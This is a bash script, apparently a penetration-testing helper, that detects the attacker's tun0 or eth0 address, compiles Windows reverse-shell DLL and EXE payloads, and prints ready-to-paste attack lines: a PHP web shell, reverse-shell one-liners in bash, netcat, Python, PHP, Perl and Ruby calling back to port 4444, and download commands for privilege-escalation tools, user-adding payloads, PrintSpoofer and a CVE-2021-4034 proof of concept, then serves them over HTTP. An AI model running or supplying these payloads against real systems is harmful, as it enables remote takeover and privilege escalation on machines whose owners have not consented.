#!/bin/bash

# get interface ip
if ifconfig tun0 &> /dev/null; then
    ip_address=$(ifconfig tun0 | grep "inet " | awk '{print $2}')

elif ifconfig eth0 &> /dev/null; then
    ip_address=$(ifconfig eth0 | grep "inet " | awk '{print $2}')
else
    exit
fi

lhost=$ip_address
lport=4444

# set up payloads
powershell_reverse_shell=$(echo -n "powershell%20-enc%20"; pwsh -File payloads/create_ps_revshell.ps1 "$lhost" $lport)

sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" payloads/cppdll_shell.cpp
sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" payloads/winshell.c
x86_64-w64-mingw32-gcc payloads/cppdll_shell.cpp --shared -o payloads/cppdll_shell.dll -lws2_32
x86_64-w64-mingw32-gcc payloads/winshell.c -o payloads/winshell.exe -lws2_32

# web app
echo ""
echo ""
echo "WEBAPP"
echo "=============================================="
echo "<?php echo system($_GET['cmd'])?>"
echo "<?php%20echo%20system($_GET['cmd'])?>"
echo ""
echo "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22" # use with php above
echo ""
echo "$powershell_reverse_shell" # use with php above
echo ""
echo ""
echo "ONE LINERS"
echo "=============================================="
echo "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
echo ""
echo "nc -e /bin/bash $lhost $lport"
echo ""
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo ""
echo "php -r '$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo ""
echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo ""
echo "ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo ""
echo ""
echo "PRIV ESC"
echo "=============================================="
echo "wget http://$lhost/enum/linpeas.sh"
echo "wget http://$lhost/enum/LinEnum.sh"
echo ""
echo "iwr -uri http://$lhost/enum/winPEASx64.exe -OutFile winpeas.exe"
echo "iwr -uri http://$lhost/enum/PowerUp.ps1 -OutFile PowerUp.ps1"
echo ""
echo "iwr -uri http://$lhost/payloads/useradd.exe -OutFile useradd.exe"
echo "iwr -uri http://$lhost/payloads/winshell.exe -OutFile winshell.exe"
echo ""
echo "iwr -uri http://$lhost/payloads/cppdll_useradd.dll -OutFile cppdll_useradd.dll"
echo "iwr -uri http://$lhost/payloads/cppdll_shell.dll -OutFile cppdll_shell.dll"
echo ""
echo "iwr -uri http://$lhost/exploits/PrintSpoof64.exe -OutFile PrintSpoof64.exe"
echo "wget http://$lhost/exploits/cve-2021-4034-poc.c"
echo ""


# Start python http server
if [[ $(ps -ef | grep "python3 -m http.server 80" | grep -v grep | wc -l) -eq 0 ]]; then
    python3 -m http.server 80
else
    echo "HTTP server is already running"
fi
